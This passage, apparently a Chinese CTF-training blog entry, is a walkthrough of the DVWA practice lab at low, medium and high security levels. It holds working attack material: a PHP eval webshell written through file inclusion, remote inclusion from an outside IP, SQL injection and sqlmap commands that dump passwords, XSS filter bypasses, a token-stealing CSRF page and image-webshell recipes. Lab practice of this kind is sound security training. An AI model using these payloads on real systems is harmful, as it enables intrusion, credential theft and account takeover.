src="https://img-blog.csdnimg.cn/20210118124150895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="命令管道符的补充："><a href="#命令管道符的补充：" class="headerlink" title="命令管道符的补充："></a>命令管道符的补充：</h2><blockquote><p>Windows系统支持的管道符如下：<br>| 直接执行后面的语句。<br>|| 如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。<br>&amp; 两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。<br>&amp;&amp; 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</p></blockquote><blockquote><p>Linux系统支持的管道符如下：<br>; 执行完前面的语句再执行后面的语句。<br>| 显示后面语句的执行结果。<br>|| 当前面的语句执行出错时，执行后面的语句。<br>&amp; 两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。<br>&amp;&amp; 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</p></blockquote><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。<img src="https://img-blog.csdnimg.cn/20210131211950245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>输入两次不一致的密码<br><img src="https://img-blog.csdnimg.cn/20210118124802606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">查看url栏发现这是个修改密码的链接(一定要查看链接所提交的内容)<br><img src="https://img-blog.csdnimg.cn/20210118125702960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">直接在url栏修改456为123<br><img src="https://img-blog.csdnimg.cn/20210118125803421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">得到password changed<br><img src="https://img-blog.csdnimg.cn/2021011813013135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_16,color_FFFFFF,t_70">再次打开DVWA时 发现登录密码错误 输入CSRF里改成的123成功登入</p><p>说明可以通过伪造url实现受害者点击跨站链接(或者写进网页文件里)修改其密码（123456）</p><blockquote><p><a href="http://localhost/DVWA(admin%20password)/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://localhost/DVWA(admin%20password)/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a></p></blockquote><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>点击几个文件发现url<code>http://localhost/DVWA/vulnerabilities/fi/?page=include.php</code><br>随便改一下：<code>http://localhost/DVWA/vulnerabilities/fi/?page=666.php</code><br><img src="https://img-blog.csdnimg.cn/20210207103351948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>存在文件包含漏洞 测试是否可以远程后(该安全等级下可以 不可以的话需要配合文件上传漏洞)<br>D盘下写一个1.txt：<br>(注意，我这儿的D盘路径与dvwa位置不在同一处，此处模拟了远程包含)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>fwrite(fopen(<span class="hljs-string">&quot;1.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php @eval(<span class="hljs-subst">$_POST</span>[123]);?&gt;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://localhost/DVWA/vulnerabilities/fi/?page=D:/1.txt</code><br>远程包含刚刚的1.txt后，发现在<code>DVWA\vulnerabilities\fi</code>下出现我们设计好的一句话木马1.php，说明远程包含成功</p><p><img src="https://img-blog.csdnimg.cn/20210207104000956.png">实际远程包含长这样<code>localhost/DVWA/vulnerabilities/fi/?page=http://110.247.68.66/1.txt</code><br>连接蚁剑即可</p><h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>没有过滤上传格式  挂上一句话<br><img src="https://img-blog.csdnimg.cn/20210119114311338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">菜刀添加马的绝对路径和密码<br><img src="https://img-blog.csdnimg.cn/20210119114656435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210119114801547.png"><br>菜刀连接成功<br><img src="https://img-blog.csdnimg.cn/20210119115012575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h2><p>环境配置错误 待补充</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>代码如下：<br>$ query  = “SELECT first_name, last_name FROM users WHERE user_id = ‘$id’;”; <strong>为数字型注入</strong></p><ul><li>手工注入：<br><code>’ or 1#</code><br><img src="https://img-blog.csdnimg.cn/20210123124222296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">查询数据库名称和版本：<br><code>1&#39; union select1,database()#</code></li></ul><p><img src="https://img-blog.csdnimg.cn/20210123125952659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">爆出账号密码：<br><code>1&#39; union select user,password from dvwa.users #</code><br><img src="https://img-blog.csdnimg.cn/20210123164921556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><strong>使用sqlmap自动注入：</strong><br>需要跟cookie参数！burp里抓一下或者F12→→Console→→document.cookie得到当前页面cookie</p><p>查询到当前用户和数据库：<br>（看起来后端DBMS是“mysql”。是否要跳过特定于其他DBMS的测试有效负载？直接跳过，不再扫描其他类型的数据库）</p><p><img src="https://img-blog.csdnimg.cn/20210123110126686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>查询当前用户（并且再查询了一次数据库）：<br><img src="https://img-blog.csdnimg.cn/2021012311045032.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>直接拖库：<br><img src="https://img-blog.csdnimg.cn/20210123110912656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">回答问题：</p><ul><li>是否要将哈希值存储到临时文件中，以便其他工具进行处理？n</li><li>你想通过基于字典的攻击破解它们吗？y</li><li>你想用什么字典？enter</li><li>是否要使用常用密码后缀？（慢）y<br><img src="https://img-blog.csdnimg.cn/20210123111032446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">爆出：<br><img src="https://img-blog.csdnimg.cn/20210123111120841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li></ul><h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>与前者无异<br><img src="https://img-blog.csdnimg.cn/20210131205918392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><p><strong>反射型</strong><br><img src="https://img-blog.csdnimg.cn/2021013121264539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210131212539124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><code>&lt;script&gt;alert(&#39;hacked&#39;)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210131212822970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><strong>存储型</strong><br><img src="https://img-blog.csdnimg.cn/20210131215016201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><code>&lt;script&gt;alert(&#39;hacked&#39;)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210131215136514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><h2 id="Brute-Force-1"><a href="#Brute-Force-1" class="headerlink" title="Brute Force"></a>Brute Force</h2><p><img src="https://img-blog.csdnimg.cn/20210205202516581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>在上一等级加了一sleep(2) 只是增加了爆破的时间而已</p><h2 id="Command-Injection-1"><a href="#Command-Injection-1" class="headerlink" title="Command Injection"></a>Command Injection</h2><p><img src="https://img-blog.csdnimg.cn/20210205203149810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210205202934944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="CSRF-1"><a href="#CSRF-1" class="headerlink" title="CSRF"></a>CSRF</h2><p>过滤规则是http包头的Referer参数的值中必须包含主机名<br><img src="https://img-blog.csdnimg.cn/20210205222605401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>同上一等级将伪造url写进一个以主机名命名的网页文件即可伪造Referer绕过</p><h2 id="File-Inclusion-1"><a href="#File-Inclusion-1" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>同样 测试可以远程包含后 直接写一个1.txt 然后本地包含 连接1.php<br>考了什么：</p><p><img src="https://img-blog.csdnimg.cn/20210207105524332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>代码即将<code>http:// ../ ..\</code>替换为空即删除 那么可以双写绕过：如<code>..././</code>过滤后变为<code>../</code></p><h2 id="File-Upload-1"><a href="#File-Upload-1" class="headerlink" title="File Upload"></a>File Upload</h2><p>文件上传的过滤分为两种:一是上传类型 二是后缀名<br>方法一：<br>抓包 改包<img src="https://img-blog.csdnimg.cn/20210207113713123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210207113609279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210207114247547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210207114026134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>方法二：<br>00截断参考<a href="https://blog.csdn.net/qq_36119192/article/details/82904642?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161266854316780261920310%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&request_id=161266854316780261920310&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-82904642.first_rank_v2_pc_rank_v29&utm_term=dvwa%20upload">谢公子的博客</a></p><p>上传完一句话后 蚁剑连接</p><h2 id="SQL-Injection-1"><a href="#SQL-Injection-1" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>换一个工具 超级sql注入(选择合适的工具 熟悉sql注入原理后 注意时效性 并且掌握注入工具的机制)<br>burp抓包 整个包放进注入中心<br><img src="https://img-blog.csdnimg.cn/20210207164641599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>点击自动识别后观察下面框内的程序运行状态<br>注入完后数据中心填入查询条数以及查出数据库 表 列</p><p><strong>回到sqlmap(yyds)</strong><br>由于medium的sql注入均为post注入（get注入在url有?id=1）<br>一般地，post有三个参数，得换个姿势：</p><p><strong>方法一：</strong><br>burp抓包，右击copy file为post.txt保存至sqlmap.py同一文件夹内<br>使用-r参数：<code>python3 sqlmap.py -r &quot;post.txt&quot; --batch</code>后面与前面的sqlmap使用无异<img src="https://img-blog.csdnimg.cn/20210210001416332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>特殊情况需要手动指定参数<a href="https://blog.csdn.net/u014549283/article/details/81290015?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">传送门</a><br><strong>方法二：</strong><br>让sqlmap自己找注入口：<br>使用:<code>python3 sqlmap.py -u &quot;url&quot; --form</code><br>后面更换参数与前面用法无异<br><code>python3 sqlmap.py -u &quot;url&quot; --form --current-db --batch</code>（加–batch参数可以不用回答问题 系统默认执行）<br><img src="https://img-blog.csdnimg.cn/20210210001742708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p><strong>方法三：</strong><br>指定参数：<code>sqlmap -u http://xxx.xxx.com/Login.asp --data &quot;id=1&quot;</code></p><h2 id="SQL-Injection-Blind-1"><a href="#SQL-Injection-Blind-1" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>与上无异</p><h2 id="XSS-1"><a href="#XSS-1" class="headerlink" title="XSS"></a>XSS</h2><p><strong>反射型</strong><br><img src="https://img-blog.csdnimg.cn/20210209183447662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">双写绕过：<code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;hacked&#39;)&lt;/script&gt;</code></p><p><strong>存储型</strong><br>同上</p><h1 id="High"><a href="#High" class="headerlink" title="High"></a>High</h1><h2 id="Command-Injection-2"><a href="#Command-Injection-2" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>过滤规则中 <code>&#39;| &#39;</code>多了一个空格 说明可以通过 | 绕过</p><h2 id="CSRF-2"><a href="#CSRF-2" class="headerlink" title="CSRF"></a>CSRF</h2><p>参考众多wp都提到一个同源策略 <a href="https://www.cnblogs.com/laixiangran/p/9064769.html">来了解一下</a><br>总结来说：同源是指域名、协议、端口相同。它是浏览器的最核心最基本的安全功能——它认为自任何站点装载的信赖内容是不安全的。当被浏览器半信半疑的脚本运行在沙箱时，它们应该<strong>只被允许访问来自同一站点的资源</strong>，而不是那些来自其它站点可能怀有恶意的资源。<br><img src="https://img-blog.csdnimg.cn/20210307181233902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">了解到这里即可<br>那么看看这题源码：<br><img src="https://img-blog.csdnimg.cn/2021030823044384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><p>可以看到，high级别加入了<code>Anti-CSRF token</code>机制：用户每一次访问修改密码的网页时，都会向服务器索要一次token(是服务器随机生成的，也是我们的目标)，当用户提交了密码修改，将token传回服务器，token正确才能更新数据库(改密)</p><p>注意到是以get方式请求的，token就会出现在地址栏传回服务器，那么思路就清晰了：我们要得到token，就必须要带有用户的cookie去访问修改密码的网页，然后截取服务器传回的token，然后带上token构造跨站请求伪造</p><p>下面是一个诱使用户点击的页面，其作用是：静默访问用户修改密码的页面(当然可以设置404回显)，获取到服务器传回的token，然后带上token和攻击url向服务器发送请求</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span><br><span class="javascript">        <span class="hljs-comment">//获取用户的token，并设置为表单中的token，然后提交修改密码的表单</span></span><br><span class="javascript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="javascript">        </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;hack&quot;</span>).contentWindow.document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value;</span><br><span class="javascript">            <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;transfer&quot;</span>).submit();</span><br><span class="javascript">        &#125;</span><br><span class="javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;attack()&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://dvwa.com/vulnerabilities/csrf/&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hack&quot;</span>  <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span>  <span class="hljs-comment">&lt;!--在该网页内打开另一个网页--&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;transfer&quot;</span>  <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://dvwa.com/vulnerabilities/csrf/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_new&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_conf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user_token&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Change&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然而，该网页应该是部署在自己推出的服务器上的，用户所在网页是<code>http://localhost/DVWA/vulnerabilities/csrf/</code>，至此，上述不符合同源策略，故攻击思路不成立</p><p>那究竟怎样才能拿到token呢，那就只能让服务器爆出token，利用xss<br><code>&lt;iframe src=&quot;../csrf/&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;&lt;/iframe&gt;</code>爆出token</p><p>（未成功）</p><h2 id="File-Inclusion-2"><a href="#File-Inclusion-2" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p><img src="https://img-blog.csdnimg.cn/20210308232241155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">这个级别要求page后面必须是file*或者include.php否则就报错<br>利用file协议打开本地文件，本地文件即在服务器下挂个一句话木马，那么则需要先配合文件上传，然后再包含连接蚁剑(可以文件上传了何必再包含 手动狗头) 其实不是，文件上传漏洞在high级别下已经不能友好的放*.php了<br>那么如何才能挂进一句话呢 看下一条</p><h2 id="File-Upload（图片马）"><a href="#File-Upload（图片马）" class="headerlink" title="File Upload（图片马）"></a>File Upload（图片马）</h2><p>先代码审计：<br><img src="https://img-blog.csdnimg.cn/20210309160727372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">首先，<code>basename()</code>函数返回路径中的文件名部分，<code>strrpos()</code>获取文件名中最后一个<code>.</code>后面的所有字符串(也就是获取后缀名的操作了)，<code>substr()</code>返回文件名中的后缀名(即strrpos截取到的内容) 以此期望过滤后缀名(jpg jpeg png通过)，然后再使用<code>getimagesize()</code>函数测定这是不是一张图片</p><blockquote><p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p></blockquote><p>那么以上操作基本不能绕过上传其他类型的文件了，下面介绍图片马的制作：<br>方法一：一个图片，一个一句话木马，使用cmd的copy拼接<code>copy 1.jpg/b + xiaoma.php/a attack.jpg</code>/a表示一个ASCII 文本文件 /b表示一个二进位文件<br>方法二：直接用记事本的方式打开图片，并且直接在乱码最后插入一句话代码即可。</p><h2 id="SQL-Injection-2"><a href="#SQL-Injection-2" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h2 id="SQL-Injection-Blind-2"><a href="#SQL-Injection-Blind-2" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><h2 id="XSS-2"><a href="#XSS-2" class="headerlink" title="XSS"></a>XSS</h2>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶场搭建问题</title>
    <link href="/2020/12/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/"/>
    <url>/2020/12/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/</url>
    
